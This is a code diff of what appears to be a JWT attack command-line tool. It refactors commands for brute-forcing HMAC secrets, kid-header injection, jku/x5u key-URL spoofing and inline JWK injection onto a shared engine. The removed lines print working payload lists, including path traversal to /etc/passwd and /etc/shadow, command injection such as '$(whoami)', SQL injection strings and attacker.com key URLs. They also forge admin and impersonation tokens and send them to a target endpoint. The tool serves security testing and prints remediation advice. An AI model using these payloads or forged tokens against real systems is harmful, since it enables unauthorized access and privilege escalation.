@@ -3430,7 +3467,7 @@ def jwt_brute_secret(ctx, token, wordlist, max_attempts, url, header, data, time
         
         # Decode token to get header and payload
         decoded = decode_jwt(token)
-        
+
         # 1️⃣ Confirm JWT uses HS* algorithm
         algorithm = decoded['header'].get('alg', '').upper()
         if not algorithm.startswith('HS'):
@@ -3438,153 +3475,102 @@ def jwt_brute_secret(ctx, token, wordlist, max_attempts, url, header, data, time
             click.echo("   This attack only works against HS256, HS384, HS512")
             if not click.confirm("Continue anyway?"):
                 return
-        
+
         click.echo(f"✅ Target algorithm: {algorithm}")
         click.echo(f"📋 Testing {min(len(secrets), max_attempts)} secrets...")
         click.echo("")
-        
-        # 2️⃣ & 3️⃣ Execute brute-force and recover secret
+
+        # 2️⃣ & 3️⃣ Recover the secret by SIGNATURE VERIFICATION (Req 16.1-16.3).
+        # A candidate is recovered if and only if verify_hmac_secret is True:
+        # the HMAC over the ORIGINAL raw header.payload segments equals the
+        # original signature. We never re-encode the full token and string-
+        # compare it to the original (Req 16.2), which previously missed valid
+        # secrets due to re-serialization differences. ``None`` sentinel is used
+        # so a legitimately recovered empty-string secret is not treated as
+        # "not found".
         found_secret = None
-        for i, secret in enumerate(secrets[:max_attempts]):
+        candidates = secrets[:max_attempts]
+        for i, secret in enumerate(candidates):
             if i % 50 == 0 and i > 0:
-                click.echo(f"🔄 Progress: {i}/{min(len(secrets), max_attempts)} ({(i/min(len(secrets), max_attempts)*100):.1f}%)")
-            
+                click.echo(f"🔄 Progress: {i}/{len(candidates)} ({(i/len(candidates)*100):.1f}%)")
             try:
-                # Try to verify token with this secret
-                test_token = encode_jwt(decoded['header'], decoded['payload'], secret)
-                if test_token == token:
+                if verify_hmac_secret(token, secret):
                     found_secret = secret
                     break
-            except:
+            except Exception:
                 continue
-        
-        if not found_secret:
+
+        if found_secret is None:
             click.echo(f"\n❌ Secret not found in wordlist")
             click.echo(f"💡 Try a larger wordlist or the secret may be strong")
             return
-        
-        # 🎉 SECRET RECOVERED!
+
+        # 🎉 SECRET RECOVERED! Report the recovered secret AND the matching
+        # algorithm (Req 16.4). The matching algorithm is the header ``alg`` that
+        # verify_hmac_secret validated the signature against.
         click.echo(f"\n" + "="*60)
         click.echo("🎉 SUCCESS! HMAC SECRET RECOVERED!")
         click.echo("="*60)
-        click.echo(f"🔑 Secret: '{found_secret}'")
+        click.echo(f"🔑 Recovered Secret: '{found_secret}'")
+        click.echo(f"🧮 Matching Algorithm: {algorithm}")
         click.echo(f"⚠️  This JWT uses a weak secret that can be brute-forced!")
         click.echo("")
-        
-        # 4️⃣ Forge new JWT with modified claims
-        click.echo("4️⃣ Forging malicious JWT tokens...")
-        
-        # Create privilege escalation payloads
-        attack_payloads = []
-        
-        # Original payload as baseline
-        original_payload = copy.deepcopy(decoded['payload'])
-        
-        # Privilege escalation attacks
-        escalation_payload = copy.deepcopy(original_payload)
-        escalation_payload.update({
-            'role': 'admin',
-            'scope': 'admin read write delete',
-            'admin': True,
-            'is_admin': True,
-            'privileges': ['admin', 'superuser', 'root']
-        })
-        attack_payloads.append(("Privilege Escalation", escalation_payload))
-        
-        # User impersonation
-        if 'sub' in original_payload:
-            impersonation_payload = copy.deepcopy(original_payload)
-            impersonation_payload['sub'] = 'admin'
-            impersonation_payload['username'] = 'admin'
-            impersonation_payload['user_id'] = '1'
-            attack_payloads.append(("User Impersonation", impersonation_payload))
-        
-        # Expiration bypass
-        if 'exp' in original_payload:
-            import time
-            extended_payload = copy.deepcopy(original_payload)
-            extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
-            attack_payloads.append(("Expiration Extension", extended_payload))
-        
-        # Generate attack tokens
-        attack_tokens = []
-        for attack_name, attack_payload in attack_payloads:
-            try:
-                attack_token = encode_jwt(decoded['header'], attack_payload, found_secret)
-                attack_tokens.append((attack_name, attack_token, attack_payload))
-                click.echo(f"✅ Generated {attack_name} token")
-            except Exception as e:
-                click.echo(f"❌ Failed to generate {attack_name} token: {e}")
-        
-        # 5️⃣ Test real API access if URL provided
-        if url and attack_tokens:
-            click.echo(f"\n5️⃣ Testing exploitation against real endpoint...")
+
+        # 4️⃣ & 5️⃣ Forge and exploit through the single-source-of-truth engine.
+        # Using the recovered secret as the signing key, the engine forges the
+        # privilege-escalation / impersonation / expiration-bypass tokens and,
+        # when a URL is supplied, issues them through the shared HTTPRequestEngine
+        # (Req 17.1). Success is decided by the engine's response analyzer, never
+        # by admin/dashboard keyword presence (Req 19.2).
+        forge_vectors = (
+            AttackType.WEAK_SECRET,
+            AttackType.PRIVILEGE_ESCALATION,
+            AttackType.USER_IMPERSONATION,
+            AttackType.EXPIRATION_BYPASS,
+        )
+
+        if url:
+            click.echo("4️⃣ Forging and testing exploitation tokens via JWTAttackEngine...")
             click.echo(f"🎯 Target: {url}")
-            
-            import asyncio
-            import httpx
-            
-            async def test_endpoint(token_name, token_value, payload_info):
+
+            async def _run():
+                http_engine = _build_jwt_http_engine(timeout)
                 try:
-                    headers = {'Authorization': f'Bearer {token_value}'}
-                    headers.update(custom_headers)
-                    
-                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
-                        if data:
-                            response = await client.post(url, headers=headers, data=data)
-                        else:
-                            response = await client.get(url, headers=headers)
-                        
-                        click.echo(f"\n🧪 {token_name} Test:")
-                        click.echo(f"   Status: {response.status_code}")
-                        click.echo(f"   Length: {len(response.text)} bytes")
-                        
-                        # Check for success indicators
-                        success_indicators = []
-                        if response.status_code in [200, 201, 202]:
-                            success_indicators.append("2xx Success Status")
-                        
-                        response_text = response.text.lower()
-                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'authorized']):
-                            success_indicators.append("Privileged Content Detected")
-                        
-                        if 'error' not in response_text and 'unauthorized' not in response_text:
-                            success_indicators.append("No Error Messages")
-                        
-                        if success_indicators:
-                            click.echo(f"   🚨 POTENTIAL VULNERABILITY: {', '.join(success_indicators)}")
-                            click.echo(f"   💀 Payload used: {json.dumps(payload_info, indent=2)}")
-                        else:
-                            click.echo(f"   ✅ Attack blocked or unsuccessful")
-                            
-                except Exception as e:
-                    click.echo(f"   ❌ Request failed: {e}")
-            
-            # Test all attack tokens
-            async def run_all_tests():
-                for token_name, token_value, payload_info in attack_tokens:
-                    await test_endpoint(token_name, token_value, payload_info)
-            
-            asyncio.run(run_all_tests())
-        
+                    engine = _make_jwt_engine(
+                        token, url, custom_headers, data,
+                        http_engine=http_engine, signing_secret=found_secret)
+                    for attack_type in forge_vectors:
+                        result = await engine.execute_attack(attack_type)
+                        _report_attack_result(result)
+                finally:
+                    await http_engine.close()
+
+            asyncio.run(_run())
+        else:
+            click.echo("4️⃣ Forging exploitation tokens via JWTAttackEngine...")
+            engine = _make_jwt_engine(
+                token, url, custom_headers, data, signing_secret=found_secret)
+            for attack_type in forge_vectors:
+                _display_generated_tokens(engine, attack_type)
+            click.echo("\n⚠️  Provide --url to test the forged tokens against an endpoint")
+
         # Summary and recommendations
         click.echo(f"\n" + "="*60)
         click.echo("🔥 ATTACK SUMMARY")
         click.echo("="*60)
-        click.echo(f"✅ Secret recovered: '{found_secret}'")
-        click.echo(f"✅ Attack tokens generated: {len(attack_tokens)}")
+        click.echo(f"✅ Secret recovered: '{found_secret}' (alg: {algorithm})")
         if url:
             click.echo(f"✅ Endpoint testing completed")
-        
+
         click.echo(f"\n💡 REMEDIATION:")
         click.echo("• Use a strong, randomly generated HMAC secret (32+ characters)")
         click.echo("• Consider switching to RS256 (asymmetric) algorithm")
         click.echo("• Implement proper secret rotation policies")
         click.echo("• Never use default or common secrets")
-        
+
         if found_secret in ["secret", "password", "123456", ""]:
             click.echo(f"\n🚨 CRITICAL: Using extremely weak secret '{found_secret}'!")
-        
+
     except Exception as e:
         click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
@@ -3654,215 +3640,23 @@ def jwt_test_kid_injection(ctx, token, kid_payload, payload, url, header, data, 
         click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
         click.echo("")
         
-        # 1️⃣ Create malicious kid injection payloads
-        click.echo("1️⃣ Creating kid injection payloads...")
-        
-        # Determine JWT payload to use
-        jwt_payloads = []
-        
-        # Use custom payload if provided
+        # Route generation + execution through the single-source-of-truth engine
+        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated kid
+        # injection payload set; a custom --payload is merged onto the base token.
+        base_token = token
         if payload:
             try:
                 custom_payload = json.loads(payload)
-                jwt_payloads.append(("Custom JWT Payload", custom_payload))
             except json.JSONDecodeError:
                 click.echo(f"❌ Invalid JSON payload: {payload}")
                 return
-        else:
-            # Create privilege escalation payloads automatically
-            original_payload = copy.deepcopy(decoded['payload'])
-            
-            # Admin privilege escalation
-            admin_payload = copy.deepcopy(original_payload)
-            admin_payload.update({
-                'sub': 'admin',
-                'role': 'admin', 
-                'admin': True,
-                'is_admin': True,
-                'scope': 'admin read write delete',
-                'privileges': ['admin', 'superuser']
-            })
-            jwt_payloads.append(("Admin Privilege Escalation", admin_payload))
-            
-            # User impersonation
-            if 'sub' in original_payload and original_payload['sub'] != 'admin':
-                impersonation_payload = copy.deepcopy(original_payload)
-                impersonation_payload['sub'] = 'admin'
-                impersonation_payload['username'] = 'admin'
-                impersonation_payload['user_id'] = '1'
-                jwt_payloads.append(("User Impersonation", impersonation_payload))
-            
-            # Extended expiration
-            if 'exp' in original_payload:
-                import time
-                extended_payload = copy.deepcopy(original_payload)
-                extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
-                jwt_payloads.append(("Extended Expiration", extended_payload))
-            
-            # If no special payloads were created, use original
-            if not jwt_payloads:
-                jwt_payloads.append(("Original Payload", original_payload))
-        
-        # 2️⃣ & 3️⃣ Path traversal and URL injection payloads
-        injection_payloads = [
-            # Custom payload first
-            ("Custom Kid", kid_payload),
-            
-            # Path traversal attacks
-            ("Linux passwd", "../../etc/passwd"),
-            ("Linux shadow", "../../../etc/shadow"), 
-            ("Windows hosts", "../../windows/system32/drivers/etc/hosts"),
-            ("Absolute path", "/etc/passwd"),
-            ("Null byte", "../../etc/passwd\x00"),
-            ("URL encoded", "..%2F..%2Fetc%2Fpasswd"),
-            
-            # Remote URL attacks
-            ("HTTP URL", "http://attacker.com/key.pem"),
-            ("HTTPS URL", "https://evil.com/malicious.key"),
-            ("FTP URL", "ftp://attacker.com/key.pem"),
-            ("File URL", "file:///etc/passwd"),
-            
-            # Command injection attempts
-            ("Command injection 1", "key'; whoami; #"),
-            ("Command injection 2", "$(whoami)"),
-            ("Command injection 3", "`whoami`"),
-            ("Command injection 4", "||whoami||"),
-            ("Command injection 5", "/dev/null; whoami #"),
-            
-            # SQL injection attempts
-            ("SQL injection 1", "'; DROP TABLE users; --"),
-            ("SQL injection 2", "' OR '1'='1"),
-            ("SQL injection 3", "' UNION SELECT * FROM users --"),
-        ]
-        
-        # Generate attack tokens (combine kid payloads with JWT payloads)
-        attack_tokens = []
-        import base64
-        
-        for jwt_payload_name, jwt_payload_data in jwt_payloads:
-            for kid_attack_name, kid_payload_data in injection_payloads:
-                # Modify header with kid injection
-                new_header = copy.deepcopy(decoded['header'])
-                new_header['kid'] = kid_payload_data
-                
-                # Create new token
-                header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
-                payload_b64 = base64.urlsafe_b64encode(json.dumps(jwt_payload_data).encode()).decode().rstrip('=')
-                
-                # For path traversal, keep original signature (might work if key is found)
-                # For command/SQL injection, remove signature (likely to fail validation anyway)
-                if any(x in kid_payload_data for x in ['../', '/etc/', 'windows', 'http://', 'https://', 'ftp://', 'file://']):
-                    # Path traversal and URL - keep signature
-                    injected_token = f"{header_b64}.{payload_b64}.{decoded['signature']}"
-                else:
-                    # Command/SQL injection - remove signature
-                    injected_token = f"{header_b64}.{payload_b64}."
-                
-                combined_name = f"{jwt_payload_name} + {kid_attack_name}"
-                attack_tokens.append((combined_name, injected_token, kid_payload_data, jwt_payload_data))
-            
-        click.echo(f"✅ Generated {len(attack_tokens)} kid injection variants")
-        
-        # Display generated tokens
-        click.echo(f"\n🎯 Generated Kid Injection Attack Tokens:")
-        click.echo("-" * 50)
-        for i, (name, token_val, kid_payload_info, jwt_payload_info) in enumerate(attack_tokens, 1):
-            click.echo(f"\n{i}. {name}:")
-            click.echo(f"   Kid: {kid_payload_info}")
-            click.echo(f"   JWT Payload: {json.dumps(jwt_payload_info)}")
-            click.echo(f"   Token: {token_val}")
-        
-        # 4️⃣ & 5️⃣ Test against real endpoint if URL provided
-        if url and attack_tokens:
-            click.echo(f"\n4️⃣ Testing kid injection against real endpoint...")
-            click.echo(f"🎯 Target: {url}")
-            
-            import asyncio
-            import httpx
-            
-            async def test_endpoint(token_name, token_value, kid_payload, jwt_payload):
-                try:
-                    headers = {'Authorization': f'Bearer {token_value}'}
-                    headers.update(custom_headers)
-                    
-                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
-                        if data:
-                            response = await client.post(url, headers=headers, data=data)
-                        else:
-                            response = await client.get(url, headers=headers)
-                        
-                        click.echo(f"\n🧪 {token_name}:")
-                        click.echo(f"   Status: {response.status_code}")
-                        click.echo(f"   Length: {len(response.text)} bytes")
-                        
-                        # Check for success indicators
-                        success_indicators = []
-                        vulnerability_type = "Unknown"
-                        
-                        if response.status_code in [200, 201, 202]:
-                            success_indicators.append("2xx Success Status")
-                        
-                        response_text = response.text.lower()
-                        
-                        # Check for file disclosure
-                        if any(indicator in response_text for indicator in ['root:', 'bin/bash', 'daemon:', 'nobody:']):
-                            success_indicators.append("File Disclosure Detected (/etc/passwd)")
-                            vulnerability_type = "File Disclosure"
-                        
-                        # Check for privileged access
-                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged']):
-                            success_indicators.append("Privileged Content Detected")
-                            vulnerability_type = "Authentication Bypass"
-                        
-                        # Check for command execution
-                        if any(indicator in response_text for indicator in ['uid=', 'gid=', 'groups=']):
-                            success_indicators.append("Command Execution Detected")
-                            vulnerability_type = "Remote Code Execution"
-                        
-                        # Check for error messages that might indicate processing
-                        if any(indicator in response_text for indicator in ['file not found', 'permission denied', 'no such file']):
-                            success_indicators.append("File System Access Attempted")
-                            vulnerability_type = "Path Traversal"
-                        
-                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
-                            success_indicators.append("No Error Messages")
-                        
-                        if success_indicators:
-                            severity = "🚨 CRITICAL" if vulnerability_type in ["File Disclosure", "Remote Code Execution"] else "🟠 HIGH"
-                            click.echo(f"   {severity} VULNERABILITY CONFIRMED!")
-                            click.echo(f"   💀 Type: {vulnerability_type}")
-                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
-                            click.echo(f"   💀 Kid payload: {kid_payload}")
-                            click.echo(f"   💀 JWT payload: {json.dumps(jwt_payload)}")
-                        else:
-                            click.echo(f"   ✅ Attack blocked or unsuccessful")
-                            
-                except Exception as e:
-                    click.echo(f"   ❌ Request failed: {e}")
-            
-            # Test all attack tokens
-            async def run_all_tests():
-                for token_name, token_value, kid_payload, jwt_payload in attack_tokens:
-                    await test_endpoint(token_name, token_value, kid_payload, jwt_payload)
-            
-            asyncio.run(run_all_tests())
-        
-        else:
-            click.echo(f"\n⚠️  Manual Testing Required:")
-            click.echo("• Test each token against your API")
-            click.echo("• Monitor server logs for file access or command execution")
-            click.echo("• Path traversal may expose sensitive files")
-            click.echo("• Command injection may execute system commands")
-            click.echo("• URL injection may cause server to fetch from attacker-controlled URLs")
-        
-        # Summary and recommendations
-        click.echo(f"\n" + "="*60)
-        click.echo("🔥 ATTACK SUMMARY")
-        click.echo("="*60)
-        click.echo(f"✅ Kid injection variants generated: {len(attack_tokens)}")
-        if url:
-            click.echo(f"✅ Endpoint testing completed")
-        
+            merged = copy.deepcopy(decoded['payload'])
+            merged.update(custom_payload)
+            base_token = encode_jwt(decoded['header'], merged, 'secret')
+
+        _run_jwt_vector(base_token, AttackType.KID_INJECTION, url, custom_headers,
+                        data, timeout)
+
         click.echo(f"\n💡 REMEDIATION:")
         click.echo("• Validate and sanitize kid parameter before use")
         click.echo("• Use allowlist of permitted key identifiers")
@@ -3870,7 +3664,7 @@ def jwt_test_kid_injection(ctx, token, kid_payload, payload, url, header, data, 
         click.echo("• Implement proper input validation and path traversal protection")
         click.echo("• Avoid dynamic key loading based on user input")
         click.echo("• Use static key stores with predefined key identifiers")
-        
+
     except Exception as e:
         click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
@@ -3929,148 +3723,12 @@ def jwt_test_jwks_spoof(ctx, token, jwks_url, url, header, data, timeout):
         click.echo(f"� Original Paayload: {json.dumps(decoded['payload'])}")
         click.echo("")
         
-        # 2️⃣ Create spoofed JWKS URLs
-        click.echo("2️⃣ Creating JWKS spoofing payloads...")
-        
-        # 3️⃣ Various JWKS URL spoofing techniques
-        jku_variations = [
-            ("Custom JWKS URL", jwks_url),
-            ("Attacker Domain", "http://attacker.com/jwks.json"),
-            ("HTTPS Attacker", "https://evil.com/.well-known/jwks.json"),
-            ("Localhost Bypass", "http://localhost:8080/jwks.json"),
-            ("Internal Network", "http://192.168.1.100/jwks.json"),
-            ("File Protocol", "file:///etc/passwd"),
-            ("FTP Protocol", "ftp://attacker.com/jwks.json"),
-            ("Data URL", "data:application/json,{\"keys\":[{\"kty\":\"RSA\"}]}"),
-            ("URL with Path Traversal", "http://legitimate.com/../../../attacker.com/jwks.json"),
-            ("Subdomain Takeover", "http://abandoned.legitimate.com/jwks.json"),
-        ]
-        
-        # Generate attack tokens
-        attack_tokens = []
-        import base64
-        
-        for attack_name, jku_url in jku_variations:
-            # Modify header with jku spoofing
-            new_header = copy.deepcopy(decoded['header'])
-            new_header['jku'] = jku_url
-            
-            # Also try x5u parameter (X.509 URL)
-            x5u_header = copy.deepcopy(decoded['header'])
-            x5u_header['x5u'] = jku_url.replace('jwks.json', 'cert.pem')
-            
-            header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
-            payload_b64 = base64.urlsafe_b64encode(json.dumps(decoded['payload']).encode()).decode().rstrip('=')
-            
-            x5u_header_b64 = base64.urlsafe_b64encode(json.dumps(x5u_header).encode()).decode().rstrip('=')
-            
-            # 4️⃣ Remove signature since we're spoofing the key source
-            spoofed_token_jku = f"{header_b64}.{payload_b64}."
-            spoofed_token_x5u = f"{x5u_header_b64}.{payload_b64}."
-            
-            attack_tokens.append((f"{attack_name} (JKU)", spoofed_token_jku, jku_url))
-            attack_tokens.append((f"{attack_name} (X5U)", spoofed_token_x5u, jku_url.replace('jwks.json', 'cert.pem')))
-        
-        click.echo(f"✅ Generated {len(attack_tokens)} JWKS spoofing variants")
-        
-        # Display generated tokens
-        click.echo(f"\n🎯 Generated JWKS Spoofing Attack Tokens:")
-        click.echo("-" * 50)
-        for i, (name, token_val, url_used) in enumerate(attack_tokens, 1):
-            click.echo(f"\n{i}. {name}:")
-            click.echo(f"   URL: {url_used}")
-            click.echo(f"   Token: {token_val}")
-        
-        # 5️⃣ Test against real endpoint if URL provided
-        if url and attack_tokens:
-            click.echo(f"\n5️⃣ Testing JWKS spoofing against real endpoint...")
-            click.echo(f"🎯 Target: {url}")
-            
-            import asyncio
-            import httpx
-            
-            async def test_endpoint(token_name, token_value, jwks_url_used):
-                try:
-                    headers = {'Authorization': f'Bearer {token_value}'}
-                    headers.update(custom_headers)
-                    
-                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
-                        if data:
-                            response = await client.post(url, headers=headers, data=data)
-                        else:
-                            response = await client.get(url, headers=headers)
-                        
-                        click.echo(f"\n🧪 {token_name}:")
-                        click.echo(f"   Status: {response.status_code}")
-                        click.echo(f"   Length: {len(response.text)} bytes")
-                        
-                        # Check for success indicators
-                        success_indicators = []
-                        
-                        if response.status_code in [200, 201, 202]:
-                            success_indicators.append("2xx Success Status")
-                        
-                        response_text = response.text.lower()
-                        
-                        # Check for privileged access
-                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'welcome']):
-                            success_indicators.append("Privileged Content Detected")
-                        
-                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
-                            success_indicators.append("No Error Messages")
-                        
-                        # Check for specific JWKS-related errors
-                        if any(indicator in response_text for indicator in ['jwks', 'key', 'certificate']):
-                            success_indicators.append("JWKS Processing Detected")
-                        
-                        if success_indicators:
-                            click.echo(f"   🚨 CRITICAL VULNERABILITY CONFIRMED!")
-                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
-                            click.echo(f"   💀 Server may have fetched from: {jwks_url_used}")
-                            click.echo(f"   💀 JWKS spoofing successful!")
-                        else:
-                            click.echo(f"   ✅ Attack blocked - server properly validates JWKS sources")
-                            
-                except Exception as e:
-                    click.echo(f"   ❌ Request failed: {e}")
-            
-            # Test all attack tokens
-            async def run_all_tests():
-                for token_name, token_value, jwks_url_used in attack_tokens:
-                    await test_endpoint(token_name, token_value, jwks_url_used)
-            
-            asyncio.run(run_all_tests())
-        
-        else:
-            click.echo(f"\n⚠️  Manual Testing Required:")
-            click.echo("• Host a malicious JWKS at the specified URLs")
-            click.echo("• Test each token against your API")
-            click.echo("• Monitor server for outbound requests to your URLs")
-            click.echo("• If server fetches from your URL, JWKS spoofing is possible")
-        
-        # Display sample malicious JWKS
-        click.echo(f"\n💡 Sample Malicious JWKS to host:")
-        click.echo("-" * 40)
-        sample_jwks = {
-            "keys": [{
-                "kty": "RSA",
-                "kid": "attacker-key-2024",
-                "use": "sig",
-                "alg": "RS256",
-                "n": "sample_modulus_replace_with_real_key",
-                "e": "AQAB"
-            }]
-        }
-        click.echo(json.dumps(sample_jwks, indent=2))
-        
-        # Summary and recommendations
-        click.echo(f"\n" + "="*60)
-        click.echo("🔥 ATTACK SUMMARY")
-        click.echo("="*60)
-        click.echo(f"✅ JWKS spoofing variants generated: {len(attack_tokens)}")
-        if url:
-            click.echo(f"✅ Endpoint testing completed")
-        
+        # Route generation + execution through the single-source-of-truth engine
+        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated
+        # jku/x5u spoofing URL set and signs with the resolved key.
+        _run_jwt_vector(token, AttackType.JWKS_SPOOF, url, custom_headers,
+                        data, timeout)
+
         click.echo(f"\n💡 REMEDIATION:")
         click.echo("• Implement JWKS URL allowlist - only trust known, legitimate URLs")
         click.echo("• Validate JWKS URLs against strict patterns")
@@ -4078,7 +3736,7 @@ def jwt_test_jwks_spoof(ctx, token, jwks_url, url, header, data, timeout):
         click.echo("• Implement network-level restrictions for JWKS fetching")
         click.echo("• Never trust user-controlled jku or x5u parameters")
         click.echo("• Consider using static key stores instead of dynamic JWKS")
-        
+
     except Exception as e:
         click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
@@ -4136,189 +3794,12 @@ def jwt_test_inline_jwks(ctx, token, url, header, data, timeout):
         click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
         click.echo("")
         
-        # 1️⃣ Generate attacker's key pair (simulated)
-        click.echo("1️⃣ Generating attacker's key pair...")
-        
-        # 2️⃣ Create malicious inline JWKS variations
-        click.echo("2️⃣ Creating inline JWKS injection payloads...")
-        
-        # Different inline JWK variations
-        jwk_variations = [
-            ("RSA Key", {
-                "kty": "RSA",
-                "kid": "attacker-rsa-key-2024",
-                "use": "sig",
-                "alg": "RS256",
-                "n": "malicious_rsa_modulus_replace_with_real_key",
-                "e": "AQAB"
-            }),
-            ("EC Key", {
-                "kty": "EC",
-                "kid": "attacker-ec-key-2024", 
-                "use": "sig",
-                "alg": "ES256",
-                "crv": "P-256",
-                "x": "malicious_ec_x_coordinate",
-                "y": "malicious_ec_y_coordinate"
-            }),
-            ("Symmetric Key", {
-                "kty": "oct",
-                "kid": "attacker-hmac-key-2024",
-                "use": "sig", 
-                "alg": "HS256",
-                "k": "YXR0YWNrZXJfc2VjcmV0X2tleQ"  # base64: attacker_secret_key
-            }),
-            ("Minimal RSA", {
-                "kty": "RSA",
-                "n": "minimal_modulus",
-                "e": "AQAB"
-            }),
-            ("Key with X5C", {
-                "kty": "RSA",
-                "kid": "attacker-x5c-key",
-                "use": "sig",
-                "n": "x5c_modulus",
-                "e": "AQAB",
-                "x5c": ["MIICertificateChainHere"]
-            })
-        ]
-        
-        # Create privilege escalation payloads
-        original_payload = copy.deepcopy(decoded['payload'])
-        
-        attack_payloads = [
-            ("Admin Privilege Escalation", {
-                **original_payload,
-                'sub': 'admin',
-                'role': 'admin', 
-                'admin': True,
-                'is_admin': True,
-                'scope': 'admin read write delete',
-                'privileges': ['admin', 'superuser']
-            }),
-            ("User Impersonation", {
-                **original_payload,
-                'sub': 'admin',
-                'username': 'admin',
-                'user_id': '1'
-            }),
-            ("Extended Expiration", {
-                **original_payload,
-                'exp': int(__import__('time').time()) + (365 * 24 * 60 * 60)  # 1 year
-            })
-        ]
-        
-        # Generate attack tokens
-        attack_tokens = []
-        import base64
-        
-        for jwk_name, malicious_jwk in jwk_variations:
-            for payload_name, attack_payload in attack_payloads:
-                # 2️⃣ Modify header with inline JWK
-                new_header = copy.deepcopy(decoded['header'])
-                new_header['jwk'] = malicious_jwk
-                
-                # 3️⃣ & 4️⃣ Create token with embedded public key (remove signature)
-                header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
-                payload_b64 = base64.urlsafe_b64encode(json.dumps(attack_payload).encode()).decode().rstrip('=')
-                
-                # Remove signature since we're using our own key
-                inline_token = f"{header_b64}.{payload_b64}."
-                
-                attack_tokens.append((f"{jwk_name} + {payload_name}", inline_token, malicious_jwk, attack_payload))
-        
-        click.echo(f"✅ Generated {len(attack_tokens)} inline JWKS variants")
-        
-        # Display generated tokens
-        click.echo(f"\n🎯 Generated Inline JWKS Attack Tokens:")
-        click.echo("-" * 50)
-        for i, (name, token_val, jwk_used, payload_used) in enumerate(attack_tokens, 1):
-            click.echo(f"\n{i}. {name}:")
-            click.echo(f"   JWK: {json.dumps(jwk_used)}")
-            click.echo(f"   Token: {token_val}")
-        
-        # 5️⃣ Test against real endpoint if URL provided
-        if url and attack_tokens:
-            click.echo(f"\n5️⃣ Testing admin access against real endpoint...")
-            click.echo(f"🎯 Target: {url}")
-            
-            import asyncio
-            import httpx
-            
-            async def test_endpoint(token_name, token_value, jwk_used, payload_used):
-                try:
-                    headers = {'Authorization': f'Bearer {token_value}'}
-                    headers.update(custom_headers)
-                    
-                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
-                        if data:
-                            response = await client.post(url, headers=headers, data=data)
-                        else:
-                            response = await client.get(url, headers=headers)
-                        
-                        click.echo(f"\n🧪 {token_name}:")
-                        click.echo(f"   Status: {response.status_code}")
-                        click.echo(f"   Length: {len(response.text)} bytes")
-                        
-                        # Check for success indicators
-                        success_indicators = []
-                        
-                        if response.status_code in [200, 201, 202]:
-                            success_indicators.append("2xx Success Status")
-                        
-                        response_text = response.text.lower()
-                        
-                        # Check for privileged access
-                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'welcome']):
-                            success_indicators.append("Privileged Content Detected")
-                        
-                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
-                            success_indicators.append("No Error Messages")
-                        
-                        # Check for JWK processing
-                        if any(indicator in response_text for indicator in ['jwk', 'key', 'signature']):
-                            success_indicators.append("JWK Processing Detected")
-                        
-                        if success_indicators:
-                            click.echo(f"   🚨 CRITICAL VULNERABILITY CONFIRMED!")
-                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
-                            click.echo(f"   💀 Server trusts embedded JWK!")
-                            click.echo(f"   💀 Complete cryptographic control achieved!")
-                            click.echo(f"   💀 Payload used: {json.dumps(payload_used)}")
-                        else:
-                            click.echo(f"   ✅ Attack blocked - server properly rejects inline JWKs")
-                            
-                except Exception as e:
-                    click.echo(f"   ❌ Request failed: {e}")
-            
-            # Test all attack tokens
-            async def run_all_tests():
-                for token_name, token_value, jwk_used, payload_used in attack_tokens:
-                    await test_endpoint(token_name, token_value, jwk_used, payload_used)
-            
-            asyncio.run(run_all_tests())
-        
-        else:
-            click.echo(f"\n⚠️  Manual Testing Required:")
-            click.echo("• Test each token against your API")
-            click.echo("• If ANY token is accepted, server trusts embedded JWK")
-            click.echo("• Attacker can sign tokens with their own key")
-            click.echo("• Proper implementation should REJECT all inline JWKs")
-        
-        # Display sample malicious JWK
-        click.echo(f"\n💡 Sample Malicious JWK (embedded in token):")
-        click.echo("-" * 45)
-        sample_jwk = jwk_variations[0][1]  # Use first RSA key as example
-        click.echo(json.dumps(sample_jwk, indent=2))
-        
-        # Summary and recommendations
-        click.echo(f"\n" + "="*60)
-        click.echo("🔥 ATTACK SUMMARY")
-        click.echo("="*60)
-        click.echo(f"✅ Inline JWKS variants generated: {len(attack_tokens)}")
-        if url:
-            click.echo(f"✅ Endpoint testing completed")
-        
+        # Route generation + execution through the single-source-of-truth engine
+        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated
+        # inline-JWK set and signs with the resolved key.
+        _run_jwt_vector(token, AttackType.INLINE_JWKS, url, custom_headers,
+                        data, timeout)
+
         click.echo(f"\n💡 REMEDIATION:")
         click.echo("• NEVER trust inline JWK parameters in JWT headers")
         click.echo("• Implement strict JWK source validation")
@@ -4326,7 +3807,7 @@ def jwt_test_inline_jwks(ctx, token, url, header, data, timeout):
         click.echo("• Reject tokens with jwk, jku, x5u, or x5c parameters")
         click.echo("• Implement proper key management with trusted sources")
         click.echo("• Use certificate pinning for key validation")
-        
+
     except Exception as e:
         click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
